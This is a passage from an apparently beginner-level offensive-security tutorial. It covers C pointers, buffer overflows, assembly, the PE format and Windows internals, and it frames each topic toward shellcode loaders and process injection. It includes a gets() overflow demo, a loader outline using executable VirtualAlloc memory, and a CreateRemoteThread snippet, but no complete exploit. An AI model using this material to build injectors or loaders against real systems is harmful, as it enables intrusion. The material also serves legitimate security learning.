## Introduction

This is the most important chapter for hacking. Pay close attention.

A **pointer** is a variable that holds a **memory address**.

Normal variables hold values (like 25).
Pointers hold addresses (like 0x7fff5c3a2abc).

## Why Pointers Matter

With pointers, you can:
- Access memory directly
- Modify memory at any address
- Pass large data without copying
- Write shellcode loaders

## Creating a Pointer

```c
#include <stdio.h>

int main() {
    int age = 25;       // Normal variable
    int *ptr;           // Pointer variable (the * means pointer)
    
    ptr = &age;         // ptr now holds the ADDRESS of age
    
    printf("Value of age: %d\n", age);
    printf("Address of age: %p\n", &age);
    printf("Value of ptr: %p\n", ptr);        // Same as &age
    printf("Value at ptr: %d\n", *ptr);       // *ptr reads the value
    
    return 0;
}
```

Output:
```
Value of age: 25
Address of age: 0x7fff5c3a2abc
Value of ptr: 0x7fff5c3a2abc
Value at ptr: 25
```

## Understanding the Symbols

| Symbol | Meaning |
|--------|---------|
| `int age` | Normal variable holding an integer |
| `int *ptr` | Pointer variable (holds an address) |
| `&age` | "Address of" - gives the address of age |
| `*ptr` | "Value at" - gives the value at the address ptr holds |

## Example: Changing a Value Through a Pointer

```c
#include <stdio.h>

int main() {
    int age = 25;
    int *ptr = &age;    // ptr points to age
    
    printf("Before: age = %d\n", age);
    
    *ptr = 30;          // Change the value at that address
    
    printf("After: age = %d\n", age);
    
    return 0;
}
```

Output:
```
Before: age = 25
After: age = 30
```

We changed `age` without using `age` directly. We changed it through the pointer.

This is exactly what happens in shellcode injection - we write to memory addresses.

## Example: Pointer to a Character (String)

```c
#include <stdio.h>

int main() {
    char *message = "Hello";
    
    printf("%s\n", message);           // Print whole string
    printf("First letter: %c\n", *message);     // First character
    printf("Second letter: %c\n", *(message+1));  // Second character
    
    return 0;
}
```

Output:
```
Hello
First letter: H
Second letter: e
```

`message` points to the first character 'H'. To get 'e', we add 1 to the pointer.

## Why This is Important for Shellcode

When you have shellcode like:
```c
unsigned char shellcode[] = "\x48\x89\x5c\x24...";
```

`shellcode` is actually a pointer to the first byte. We can pass this pointer to Windows APIs to execute it.

---

# CHAPTER 14: What is a Function

## Introduction

A function is a block of code that does a specific job. You call it when you need that job done.

## Example: Greeting Function

```c
#include <stdio.h>

// This is a function
void sayHello() {
    printf("Hello!\n");
}

int main() {
    sayHello();    // Call the function
    sayHello();    // Call it again
    sayHello();    // And again
    
    return 0;
}
```

Output:
```
Hello!
Hello!
Hello!
```

We wrote the code once, but used it three times.

## Function with Parameters

Functions can receive values:

```c
#include <stdio.h>

void greet(char *name) {
    printf("Hello, %s!\n", name);
}

int main() {
    greet("Vamsi");
    greet("Krishna");
    greet("Ravi");
    
    return 0;
}
```

Output:
```
Hello, Vamsi!
Hello, Krishna!
Hello, Ravi!
```

## Function that Returns a Value

```c
#include <stdio.h>

int add(int a, int b) {
    int result = a + b;
    return result;
}

int main() {
    int sum = add(5, 3);
    printf("5 + 3 = %d\n", sum);
    
    int another = add(100, 200);
    printf("100 + 200 = %d\n", another);
    
    return 0;
}
```

Output:
```
5 + 3 = 8
100 + 200 = 300
```

## Example: Age Checker Function

```c
#include <stdio.h>

int canVote(int age) {
    if (age >= 18) {
        return 1;    // 1 means yes
    } else {
        return 0;    // 0 means no
    }
}

int main() {
    int myAge = 25;
    int friendAge = 16;
    
    if (canVote(myAge)) {
        printf("I can vote!\n");
    }
    
    if (canVote(friendAge)) {
        printf("My friend can vote!\n");
    } else {
        printf("My friend cannot vote yet.\n");
    }
    
    return 0;
}
```

Output:
```
I can vote!
My friend cannot vote yet.
```

## What Happens When You Call a Function?

Remember the stack from Chapter 9?

When you call a function:
1. The return address is pushed to stack (where to come back)
2. Function parameters are set up
3. Function runs
4. Function returns, return address is popped
5. Execution continues from return address

This is why buffer overflows are dangerous - they can overwrite the return address!

---

# CHAPTER 15: Arrays and Strings

## Introduction

What if you want to store many values? Use an array.

An array is a list of values in a row.

## Example: List of Numbers

```c
#include <stdio.h>

int main() {
    int scores[5];       // Array of 5 integers
    
    scores[0] = 90;      // First element (index 0)
    scores[1] = 85;
    scores[2] = 78;
    scores[3] = 92;
    scores[4] = 88;      // Last element (index 4)
    
    printf("First score: %d\n", scores[0]);
    printf("Last score: %d\n", scores[4]);
    
    // Print all scores
    for (int i = 0; i < 5; i++) {
        printf("Score %d: %d\n", i, scores[i]);
    }
    
    return 0;
}
```

Output:
```
First score: 90
Last score: 88
Score 0: 90
Score 1: 85
Score 2: 78
Score 3: 92
Score 4: 88
```

## Important: Arrays Start at Index 0

If you have 5 elements, the indexes are 0, 1, 2, 3, 4.

NOT 1, 2, 3, 4, 5.

This is a very common mistake for beginners.

## Memory Layout of an Array

In memory, array elements are next to each other:

```
Address:  1000    1004    1008    1012    1016
          [90]    [85]    [78]    [92]    [88]
          [0]     [1]     [2]     [3]     [4]
```

Each int is 4 bytes. So each element is 4 bytes apart.

## What is a String?

A string is an array of characters ending with a null byte (0).

```c
#include <stdio.h>

int main() {
    char name[10] = "Hello";
    
    // name contains: H, e, l, l, o, \0, ?, ?, ?, ?
    // \0 is the null byte (value 0)
    
    printf("String: %s\n", name);
    printf("First char: %c\n", name[0]);
    printf("Second char: %c\n", name[1]);
    
    return 0;
}
```

Output:
```
String: Hello
First char: H
Second char: e
```

## Memory Layout of "Hello"

```
Index:   0    1    2    3    4    5    6    7    8    9
Value:   H    e    l    l    o   \0    ?    ?    ?    ?
Hex:    48   65   6C   6C   6F   00    ??   ??   ??   ??
```

The \0 (null byte) tells functions like printf where the string ends.

## Example: Changing a String

```c
#include <stdio.h>

int main() {
    char name[10] = "Hello";
    
    printf("Before: %s\n", name);
    
    name[0] = 'J';    // Change H to J
    
    printf("After: %s\n", name);
    
    return 0;
}
```

Output:
```
Before: Hello
After: Jello
```

---

# CHAPTER 16: What is Buffer Overflow

## Introduction

This chapter is very important. It explains how many exploits work.

## What is a Buffer?

A buffer is just an array of bytes used to hold data.

When a program says "enter your name", it creates a buffer to store your input.

## The Problem

What if your buffer is 10 characters, but you type 20 characters?

```c
#include <stdio.h>
#include <string.h>

int main() {
    char password[8] = "secret";   // Password (should be secret)
    char name[10];                  // Buffer for name
    
    printf("Password in memory: %s\n", password);
    printf("Enter your name: ");
    
    gets(name);    // DANGEROUS! No limit on input
    
    printf("Hello, %s!\n", name);
    printf("Password in memory: %s\n", password);
    
    return 0;
}
```

## What Happens Normally?

If you type "Vamsi" (5 characters):
```
Enter your name: Vamsi
Hello, Vamsi!
Password in memory: secret
```

Everything is fine.

## What Happens With Long Input?

If you type "AAAAAAAAAAAAAAAAAA" (18 A's):
```
Enter your name: AAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAA!
Password in memory: AAAAAAA
```

The password got overwritten! The extra A's went into the password variable.

## Memory Layout Explanation

Before input:
```
Address:  100-109      110-117
Variable: name          password
Value:    [empty]       [secret]
```

After typing 18 A's:
```
Address:  100-109      110-117
Variable: name          password  
Value:    [AAAAAAAAAA] [AAAAAAAA]
          10 A's here   8 A's here (overflow!)
```

The name buffer overflowed into the password buffer.

## The Real Danger: Overwriting Return Address

Remember the stack from Chapter 9? Local variables are on the stack. The return address is also on the stack.

If you overflow enough, you can overwrite the return address.

```
Stack (before overflow):
-----------------------
| Return Address      |  <- Points to caller
-----------------------
| Saved Base Pointer  |
-----------------------
| name[0-9]           |  <- Your buffer
-----------------------

Stack (after overflow):
-----------------------
| AAAAAAAAAAAAAAAA    |  <- Return address is now 0x41414141 (AAAA)!
-----------------------
| AAAAAAAA            |
-----------------------
| AAAAAAA...          |
-----------------------
```

When the function returns, it tries to jump to 0x41414141 (which is "AAAA" in hex).

If you put a real address there instead of AAAA, the program jumps to that address.

If that address contains your shellcode... you win.

## Why This is the Foundation of Many Exploits

1. Find a buffer overflow vulnerability
2. Overwrite the return address with address of your shellcode
3. When function returns, it jumps to your shellcode
4. Your shellcode runs
5. You have control

## Modern Protections

Today, there are protections against this:
- **Stack canaries** - Special values that detect overflow
- **ASLR** - Randomizes addresses so you cannot predict them
- **DEP/NX** - Makes stack non-executable (shellcode cannot run directly from stack)

We will learn how to bypass these later. But you need to understand the basics first.

---

*End of Portion 4 - Chapters 11, 12, 13, 14, 15, 16*

*What you learned:*
- *How to set up C programming on Windows*
- *Variables are named boxes in memory*
- *Pointers hold memory addresses*
- *Functions are reusable blocks of code*
- *Arrays are lists of values in a row*
- *Strings are character arrays ending with null byte*
- *Buffer overflow happens when you write past the end of a buffer*
- *Overwriting return address can give you code execution*

*Next portion: How source code becomes an executable*

---

# PART 4: FROM SOURCE CODE TO EXECUTABLE

---

# CHAPTER 17: What is Compilation

## Introduction

You write code in C. The computer only understands bytes.

How does your code become a running program?

Answer: **Compilation**.

## The Journey of Your Code

```
Your C Code (.c file)
        ↓
    Preprocessor (handles #include)
        ↓
    Compiler (turns C into assembly)
        ↓
    Assembler (turns assembly into machine code)
        ↓
    Linker (combines everything into .exe)
        ↓
Executable File (.exe)
```

## Let Us Watch It Happen!

Create a file called `test.c`:

```c
#include <stdio.h>

int main() {
    int x = 5;
    int y = 3;
    int sum = x + y;
    printf("Sum: %d\n", sum);
    return 0;
}
```

**Step 1: See the preprocessed output**

```
cl /E test.c > preprocessed.txt
```

Open `preprocessed.txt`. You will see THOUSANDS of lines! The `#include <stdio.h>` got replaced with the entire contents of stdio.h.

**Step 2: See the assembly output**

```
cl /Fa test.c
```

This creates `test.asm`. Open it and you will see assembly code:

```asm
_main   PROC
        push    ebp
        mov     ebp, esp
        sub     esp, 12
        mov     DWORD PTR _x$[ebp], 5
        mov     DWORD PTR _y$[ebp], 3
        mov     eax, DWORD PTR _x$[ebp]
        add     eax, DWORD PTR _y$[ebp]
        mov     DWORD PTR _sum$[ebp], eax
        ...
```

This is what your `int sum = x + y;` became!

**Step 3: Create the final executable**

```
cl test.c
```

This creates `test.exe`. This is the final file Windows can run.

## What Each Step Does

| Step | Input | Output | What It Does |
|------|-------|--------|--------------|
| Preprocessor | .c file | Expanded .c | Replaces #include with file contents |
| Compiler | Expanded .c | .asm (assembly) | Translates C to assembly language |
| Assembler | .asm | .obj (object file) | Translates assembly to machine code |
| Linker | .obj files | .exe | Combines code and resolves function addresses |

## Why This Matters

1. **Shellcode is machine code** - The final bytes that the CPU executes
2. **Assembly helps you understand** - You can see exactly what instructions run
3. **Object files** - When you compile parts separately, then link them
4. **Symbols** - Function names and variable names exist until final linking

---

# CHAPTER 18: Assembly Language Fundamentals

## Introduction

Assembly is the human-readable form of machine code.

Each line of assembly becomes a few bytes of machine code.

## Why Learn Assembly?

- To understand shellcode
- To debug exploits
- To reverse engineer malware
- To write low-level code

You do not need to become an expert. Just understand the basics.

## Registers Refresh

Remember from Chapter 7, registers are fast storage inside the CPU:

| Register | Size | Common Use |
|----------|------|------------|
| RAX | 64-bit | Return values, general math |
| RBX | 64-bit | General purpose |
| RCX | 64-bit | Counter, 1st parameter (Windows) |
| RDX | 64-bit | 2nd parameter (Windows) |
| RSP | 64-bit | Stack pointer (top of stack) |
| RBP | 64-bit | Base pointer |
| RIP | 64-bit | Instruction pointer (next instruction) |
| R8-R15 | 64-bit | Extra registers |

**Smaller portions:**
- RAX (64-bit) → EAX (lower 32-bit) → AX (lower 16-bit) → AL (lower 8-bit)

## Basic Assembly Instructions

**Moving data:**
```asm
mov rax, 5        ; Put 5 in RAX
mov rbx, rax      ; Copy RAX to RBX (now RBX = 5)
mov [rax], rbx    ; Write RBX to memory address in RAX
mov rcx, [rax]    ; Read from memory address in RAX into RCX
```

**Math:**
```asm
add rax, 5        ; RAX = RAX + 5
sub rax, 3        ; RAX = RAX - 3
inc rax           ; RAX = RAX + 1
dec rax           ; RAX = RAX - 1
mul rbx           ; RAX = RAX * RBX
```

**Stack operations:**
```asm
push rax          ; Put RAX on stack, RSP goes down
pop rbx           ; Take value from stack into RBX, RSP goes up
```

**Function calls:**
```asm
call myFunction   ; Push return address, jump to myFunction
ret               ; Pop return address, jump there
```

**Comparisons and jumps:**
```asm
cmp rax, 5        ; Compare RAX with 5
je  label1        ; Jump to label1 if equal
jne label2        ; Jump to label2 if not equal
jmp label3        ; Always jump to label3
```

## Example: Our C Code in Assembly

This C code:
```c
int x = 5;
int y = 3;
int sum = x + y;
```

Becomes (simplified):
```asm
mov DWORD PTR [rbp-4], 5    ; x = 5 (store at stack location)
mov DWORD PTR [rbp-8], 3    ; y = 3 (store at stack location)
mov eax, DWORD PTR [rbp-4]  ; Load x into EAX
add eax, DWORD PTR [rbp-8]  ; Add y to EAX
mov DWORD PTR [rbp-12], eax ; Store result as sum
```

## Example: What printf("Hello") Looks Like

```asm
lea rcx, hello_string      ; Load address of "Hello" into RCX (1st param)
call printf                ; Call printf function
```

## Seeing It Yourself

Compile with debug info and disassemble:

**In Visual Studio Developer Command Prompt:**
```
cl /Zi test.c
dumpbin /disasm test.exe > disasm.txt
```

Open `disasm.txt` and search for `main`. You will see the actual assembly!

## Key Assembly Patterns to Recognize

**Function start (prologue):**
```asm
push rbp          ; Save old base pointer
mov rbp, rsp      ; Set up new base pointer
sub rsp, 32       ; Make space for local variables
```

**Function end (epilogue):**
```asm
add rsp, 32       ; Clean up local variables
pop rbp           ; Restore old base pointer
ret               ; Return to caller
```

**This is what buffer overflow attacks target!** They overwrite the saved return address.

---

# CHAPTER 19: The PE Executable Format

## Introduction

When you compile a program, you get an .exe file.

But what is inside that file?

The .exe file follows a specific format called **PE** (Portable Executable).

## Let Us Look Inside!

Open PowerShell and run:

```powershell
Format-Hex -Path "C:\Windows\notepad.exe" | Select-Object -First 50
```

You will see something like:
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............
00000010   B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
```

The first two bytes are `4D 5A` which is "MZ" in ASCII.

**Every Windows executable starts with "MZ"!**

## PE File Structure

```
┌─────────────────────────┐
│     DOS Header          │ ← Starts with "MZ" (0x4D 0x5A)
│     (64 bytes)          │
├─────────────────────────┤
│     DOS Stub            │ ← Old DOS program ("This program cannot...")
│     (variable size)     │
├─────────────────────────┤
│     PE Signature        │ ← "PE\0\0" (0x50 0x45 0x00 0x00)
├─────────────────────────┤
│     File Header         │ ← Basic info (machine type, number of sections)
│     (20 bytes)          │
├─────────────────────────┤
│     Optional Header     │ ← Entry point, image base, section alignment
│     (varies)            │
├─────────────────────────┤
│     Section Headers     │ ← Info about each section
│     (40 bytes each)     │
├─────────────────────────┤
│     Sections            │ ← Actual code and data:
│     .text  (code)       │   - .text = program code
│     .data  (data)       │   - .data = global variables
│     .rdata (read-only)  │   - .rdata = constants, import info
│     .rsrc  (resources)  │   - .rsrc = icons, strings
└─────────────────────────┘
```

## Important Parts for Us

**1. Entry Point**

This is the address where execution starts. When you double-click an .exe, Windows jumps to this address.

**2. Image Base**

The preferred address where the .exe wants to be loaded in memory.

64-bit programs usually: 0x0000000140000000
32-bit programs usually: 0x00400000

**3. Sections**

| Section | Contains | Permissions |
|---------|----------|-------------|
| .text | Program code | Read + Execute |
| .data | Variables that can change | Read + Write |
| .rdata | Constants | Read only |
| .rsrc | Resources (icons, etc) | Read only |

## Viewing PE Details with PowerShell

```powershell
# Get detailed PE information
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\notepad.exe")

# DOS Header check
if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
    Write-Host "Valid DOS Header (MZ)" -ForegroundColor Green
}

# Find PE signature offset (at byte 0x3C in DOS header)
$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
Write-Host "PE Header at offset: 0x$($peOffset.ToString('X'))"

# Check PE signature
if ($bytes[$peOffset] -eq 0x50 -and $bytes[$peOffset+1] -eq 0x45) {
    Write-Host "Valid PE Signature" -ForegroundColor Green
}
```

## Why PE Format Matters for Hacking

1. **Entry Point** - You can change where execution starts
2. **Sections** - You can add new sections with your code
3. **Import Table** - Lists which DLLs and functions the program uses
4. **Export Table** - Lists what functions the program provides

When you analyze malware, you look at the PE structure to understand:
- What functions does it call?
- Is there suspicious code hidden?
- Has it been modified from the original?

---

# CHAPTER 20: How Windows Loads a Program

## Introduction

You double-click notepad.exe. What actually happens?

Let us trace the entire journey step by step.

## Step 1: You Double-Click

When you double-click, Windows Explorer calls `CreateProcess()` with the path to notepad.exe.

## Step 2: Windows Reads the File

Windows opens notepad.exe and reads the PE headers:
- Checks the MZ and PE signatures
- Reads the entry point address
- Reads what sections exist
- Reads what DLLs are needed

## Step 3: Memory is Allocated

Windows creates a new process and allocates virtual memory:

```
User Space (available to notepad.exe):
┌─────────────────────────┐ 0x00007FFFFFFFFFFF
│                         │
│   Stack (grows down)    │
│                         │
├─────────────────────────┤
│   (free space)          │
├─────────────────────────┤
│   Heap (grows up)       │
├─────────────────────────┤
│   DLLs loaded here      │
│   kernel32.dll          │
│   ntdll.dll             │
│   user32.dll            │
├─────────────────────────┤
│   notepad.exe           │ ← Image loaded at base address
│   .text                 │
│   .data                 │
│   .rdata                │
├─────────────────────────┤ 0x0000000000000000

Kernel Space (not accessible to notepad.exe):
├─────────────────────────┤
│   Windows Kernel        │ ← Cannot touch this!
└─────────────────────────┘
```

## Step 4: The Image is Mapped

Windows copies each section from the file into memory:

- .text section → memory with Execute permission
- .data section → memory with Read+Write permission
- .rdata section → memory with Read permission

## Step 5: DLLs are Loaded

Notepad needs functions from DLLs (like MessageBox from user32.dll).

Windows loads each required DLL:
1. Find the DLL file
2. Map it into the process memory
3. Repeat for any DLLs that DLL needs

## Step 6: Imports are Resolved

The Import Table says: "I need MessageBoxW from user32.dll"

Windows:
1. Finds where user32.dll was loaded
2. Finds MessageBoxW in user32.dll's Export Table
3. Writes that address into notepad's Import Table

Now when notepad calls MessageBoxW, it knows exactly where to jump.

## Step 7: Entry Point is Called

Windows finally calls the entry point.

For a C program, this is NOT main()!

The actual entry point does setup work, then calls your main().

```
Windows calls → _mainCRTStartup()
                    ↓
                Sets up C runtime
                    ↓
                Calls your main()
                    ↓
                Your code runs!
```

## Step 8: Program Runs

The CPU starts executing instructions from the entry point.

Your program is now running!

## Watching It Happen

You can use Process Monitor (procmon) from Sysinternals to watch this:

1. Download Process Monitor from Microsoft Sysinternals
2. Set filter: "Process Name is notepad.exe"
3. Double-click notepad.exe
4. Watch all the file reads, registry access, and DLL loads!

## Why This Matters for Your Attack

When you inject shellcode:

1. You need **executable memory** - Windows normally does not let you execute data
2. You need to **bypass protections** - ASLR randomizes where things load
3. You need to **call APIs** - Your shellcode needs to find function addresses

Understanding how Windows loads programs helps you understand:
- Where to put your shellcode
- How to find API addresses
- What security is checking

---

*End of Portion 5 - Chapters 17, 18, 19, 20*

*What you learned:*
- *Compilation turns your C code into machine code through multiple steps*
- *Assembly is human-readable machine code*
- *PE format is how Windows executables are structured*
- *Windows loads programs by mapping sections, loading DLLs, and resolving imports*
- *The entry point is where execution begins*

*Next portion: Windows Internals (Processes, Threads, Virtual Memory, APIs, DLLs)*

---

# PART 5: WINDOWS INTERNALS

---

# CHAPTER 21: What is a Process

## Introduction

When you run a program, Windows creates a **process**.

A process is an isolated environment where the program runs.

## What a Process Actually Is

A process has:
- **Memory space** - Its own private memory (other programs cannot see it)
- **Handle table** - List of files, windows, and resources it has opened
- **At least one thread** - The actual execution
- **Security token** - What permissions it has

## See Processes Right Now

Open Task Manager (Ctrl+Shift+Esc) and go to "Details" tab.

Each row is a process. You can see:
- PID (Process ID) - Unique number for this process
- Name - The executable name
- Status - Running, Suspended, etc.
- Memory - How much RAM it uses

## Hands-On: Creating a Process in C

Let us write a program that creates another process (starts notepad):

```c
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    // Initialize structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Create a new process (start notepad)
    BOOL success = CreateProcess(
        NULL,                   // Application name (NULL = use command line)
        "notepad.exe",         // Command line
        NULL,                   // Process security attributes
        NULL,                   // Thread security attributes
        FALSE,                  // Don't inherit handles
        0,                      // Creation flags (0 = normal)
        NULL,                   // Use parent's environment
        NULL,                   // Use parent's current directory
        &si,                    // Startup info
        &pi                     // Process information (output)
    );
    
    if (success) {
        printf("Notepad started!\n");
        printf("Process ID (PID): %d\n", pi.dwProcessId);
        printf("Thread ID (TID): %d\n", pi.dwThreadId);
        
        // Close handles (important to avoid resource leak)
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("Failed to start notepad. Error: %d\n", GetLastError());
    }
    
    return 0;
}
```

Compile and run:
```
cl create_process.c
create_process.exe
```

You will see notepad open, and your program prints the PID!

## Important Process Structures

**PROCESS_INFORMATION** gives us:
- `hProcess` - Handle to the new process
- `hThread` - Handle to its main thread
- `dwProcessId` - The PID
- `dwThreadId` - The main thread's ID

## Why Processes Matter for Hacking

1. **Process Injection** - We inject our code into another process
2. **Process Hollowing** - We replace a process's code with our own
3. **Process Memory** - We can read/write other processes' memory (with permission)

The `hProcess` handle is your key to interacting with a process!

## Hands-On: List All Processes

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to get process snapshot\n");
        return 1;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    printf("%-10s %-30s\n", "PID", "Process Name");
    printf("==========================================\n");
    
    if (Process32First(snapshot, &pe)) {
        do {
            printf("%-10d %-30s\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}
```

Run it and see all processes on your system!

---

# CHAPTER 22: What is a Thread

## Introduction

A process is like a house. A thread is a person living in that house doing work.

One house can have many people (one process can have many threads).

All threads in a process share the same memory, but each thread has its own:
- Stack (local variables)
- Registers (current state)
- Instruction pointer (where it is executing)

## Why Multiple Threads?

Imagine a browser:
- Thread 1: Handles button clicks
- Thread 2: Downloads files
- Thread 3: Plays video
- Thread 4: Renders the page

All running at the same time (or quickly switching between).

## Hands-On: Create a Thread in C

```c
#include <windows.h>
#include <stdio.h>

// This function runs in the new thread
DWORD WINAPI ThreadFunction(LPVOID lpParam) {
    int threadNum = *(int*)lpParam;
    
    for (int i = 0; i < 5; i++) {
        printf("Thread %d: Count %d\n", threadNum, i);
        Sleep(500);  // Wait 500 milliseconds
    }
    
    return 0;
}

int main() {
    int thread1Num = 1;
    int thread2Num = 2;
    
    printf("Main: Creating threads...\n");
    
    // Create first thread
    HANDLE hThread1 = CreateThread(
        NULL,           // Default security
        0,              // Default stack size
        ThreadFunction, // Function to run
        &thread1Num,    // Parameter to pass
        0,              // Run immediately
        NULL            // Don't need thread ID
    );
    
    // Create second thread
    HANDLE hThread2 = CreateThread(
        NULL,
        0,
        ThreadFunction,
        &thread2Num,
        0,
        NULL
    );
    
    printf("Main: Threads created! Waiting for them to finish...\n");
    
    // Wait for both threads to complete
    WaitForSingleObject(hThread1, INFINITE);
    WaitForSingleObject(hThread2, INFINITE);
    
    printf("Main: Both threads finished!\n");
    
    CloseHandle(hThread1);
    CloseHandle(hThread2);
    
    return 0;
}
```

Output:
```
Main: Creating threads...
Main: Threads created! Waiting for them to finish...
Thread 1: Count 0
Thread 2: Count 0
Thread 1: Count 1
Thread 2: Count 1
...
Main: Both threads finished!
```

The threads run at the same time!

## Why Threads Matter for Hacking

**CreateRemoteThread** - This is the key function for process injection!

It creates a thread in ANOTHER process:

```c
HANDLE hRemoteThread = CreateRemoteThread(
    hProcess,           // Handle to target process
    NULL,               // Default security
    0,                  // Default stack size
    startAddress,       // Where to start executing (your shellcode!)
    parameter,          // Parameter
    0,                  // Run immediately
    NULL                // Don't need thread ID
);
```

This makes the target process run YOUR code!

---

# CHAPTER 23: What is Virtual Memory

## Introduction

Every process thinks it has all the memory to itself.

Process A thinks it owns addresses 0 to 0x7FFFFFFFFFFF.
Process B ALSO thinks it owns addresses 0 to 0x7FFFFFFFFFFF.

But they have different data at the same addresses. How?

**Virtual memory.**

## How Virtual Memory Works

Each process has its own "address translation table" (page table).

When Process A reads address 0x1000:
- Windows translates 0x1000 → Physical address 0x50000
- Process A gets data from physical location 0x50000

When Process B reads address 0x1000:
- Windows translates 0x1000 → Physical address 0x80000 (different!)
- Process B gets different data

Same virtual address, different physical memory!

## Memory Permissions

Each memory region has permissions:

| Permission | Meaning |
|------------|---------|
| No Access | Cannot read/write/execute |
| Read | Can read but not write |
| Read/Write | Can read and write |
| Execute | Can execute as code |
| Read/Write/Execute | Can do everything (dangerous!) |

## Hands-On: Allocate Memory with VirtualAlloc

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Allocate 4096 bytes (one page) of memory
    LPVOID buffer = VirtualAlloc(
        NULL,                          // Let Windows choose address
        4096,                          // Size in bytes
        MEM_COMMIT | MEM_RESERVE,      // Allocate and commit the memory
        PAGE_READWRITE                 // Permissions: read + write
    );
    
    if (buffer == NULL) {
        printf("VirtualAlloc failed. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("Memory allocated at: %p\n", buffer);
    
    // Write something to it
    char* message = "Hello from allocated memory!";
    memcpy(buffer, message, strlen(message) + 1);
    
    // Read it back
    printf("Content: %s\n", (char*)buffer);
    
    // Free the memory
    VirtualFree(buffer, 0, MEM_RELEASE);
    printf("Memory freed.\n");
    
    return 0;
}
```

Output:
```
Memory allocated at: 0x000001A234560000
Content: Hello from allocated memory!
Memory freed.
```

## VirtualAlloc Parameters

| Parameter | Meaning |
|-----------|---------|
| `NULL` | Let Windows choose the address |
| `4096` | Size in bytes (must be page-aligned, 4096 is one page) |
| `MEM_COMMIT` | Actually allocate physical memory |
| `MEM_RESERVE` | Reserve address space |
| `PAGE_READWRITE` | Can read and write, but NOT execute |

## The Critical Permission: PAGE_EXECUTE_READWRITE

For shellcode, we need to EXECUTE the memory:

```c
LPVOID executableMemory = VirtualAlloc(
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE    // Can read, write, AND execute!
);
```

**This is how shellcode loaders work:**
1. Allocate memory with execute permission
2. Copy shellcode into that memory
3. Jump to that memory (execute it)

## Hands-On: Query Memory Information

```c
#include <windows.h>
#include <stdio.h>

int main() {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = (LPVOID)0x7FFE0000;  // Common system address
    
    if (VirtualQuery(address, &mbi, sizeof(mbi))) {
        printf("Address: %p\n", mbi.BaseAddress);
        printf("Region Size: %llu bytes\n", mbi.RegionSize);
        printf("State: ");
        
        switch (mbi.State) {
            case MEM_COMMIT: printf("Committed\n"); break;
            case MEM_FREE: printf("Free\n"); break;
            case MEM_RESERVE: printf("Reserved\n"); break;
        }
        
        printf("Protection: 0x%X\n", mbi.Protect);
    }
    
    return 0;
}
```

---

# CHAPTER 24: What is Windows API

## Introduction

Windows API (Application Programming Interface) is a set of functions that Windows provides.

When you want to:
- Open a file → Call CreateFile()
- Show a window → Call CreateWindowEx()
- Allocate memory → Call VirtualAlloc()
- Create a process → Call CreateProcess()

You ask Windows to do it through these functions.

## API Layers

```
Your Program
     ↓
kernel32.dll (High-level API)
     ↓
ntdll.dll (Low-level API, Nt* functions)
     ↓
SYSCALL instruction
     ↓
Windows Kernel (Does the actual work)
```

When you call CreateFile(), you are actually calling:
1. kernel32.dll!CreateFile()
2. Which calls ntdll.dll!NtCreateFile()
3. Which makes a syscall to the kernel
4. The kernel opens the file

## Hands-On: Calling Windows API

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Get current process ID
    DWORD pid = GetCurrentProcessId();
    printf("My Process ID: %d\n", pid);
    
    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    
    if (GetComputerNameA(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    }
    
    // Get user name
    char userName[256];
    size = sizeof(userName);
    
    if (GetUserNameA(userName, &size)) {
        printf("User Name: %s\n", userName);
    }
    
    // Get current directory
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    printf("Current Directory: %s\n", currentDir);
    
    // Get Windows version
    OSVERSIONINFO osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    
    // This is deprecated but shows the concept
    // GetVersionExA(&osvi);
    
    return 0;
}
```

## Important APIs for Offensive Work

**Memory:**
- `VirtualAlloc()` - Allocate memory
- `VirtualProtect()` - Change memory permissions
- `VirtualAllocEx()` - Allocate in another process
- `WriteProcessMemory()` - Write to another process

**Process/Thread:**
- `CreateProcess()` - Start a new process
- `OpenProcess()` - Get handle to existing process
- `CreateThread()` - Create thread in current process
- `CreateRemoteThread()` - Create thread in another process

**Module:**
- `GetModuleHandle()` - Get address where DLL is loaded
- `GetProcAddress()` - Get address of a function
- `LoadLibrary()` - Load a DLL

## Hands-On: Find Function Address

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Get handle to kernel32.dll
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    printf("kernel32.dll loaded at: %p\n", hKernel32);
    
    // Get address of VirtualAlloc function
    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    printf("VirtualAlloc is at: %p\n", pVirtualAlloc);
    
    // Get address of CreateProcessA
    LPVOID pCreateProcess = GetProcAddress(hKernel32, "CreateProcessA");
    printf("CreateProcessA is at: %p\n", pCreateProcess);
    
    // We can also get ntdll functions
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    printf("\nntdll.dll loaded at: %p\n", hNtdll);
    
